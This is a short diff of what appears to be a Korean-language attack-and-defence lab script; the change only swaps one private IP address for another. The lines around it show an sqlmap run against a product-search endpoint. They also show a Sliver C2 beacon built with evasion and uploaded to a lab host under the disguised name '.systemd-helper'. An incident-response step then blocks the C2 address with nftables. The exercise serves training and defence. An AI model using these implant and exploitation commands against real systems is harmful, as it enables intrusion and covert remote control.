@@ -705,8 +705,8 @@ sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
 # === Phase 3: Establish Foothold (10분) ===
 # Sliver C2 implant
 sliver-server &
-sliver > mtls --lhost 192.168.0.112 --lport 443
-sliver > generate beacon --mtls 192.168.0.112:443 --evasion --save /tmp/sliver-beacon
+sliver > mtls --lhost 10.20.30.202 --lport 443
+sliver > generate beacon --mtls 10.20.30.202:443 --evasion --save /tmp/sliver-beacon
 
 # Implant 업로드 + 실행
 scp /tmp/sliver-beacon ccc@10.20.30.80:/tmp/.systemd-helper
@@ -780,7 +780,7 @@ sudo cscli decisions list | head -10
 # === 수동 IR ===
 # 1. 침해 호스트 격리
 ssh ccc@10.20.30.1
-sudo nft add element inet filter blocked '{ 192.168.0.112 }'
+sudo nft add element inet filter blocked '{ 10.20.30.202 }'
 
 # 2. 침해 host 의 evidence 수집
 ssh ccc@10.20.30.80
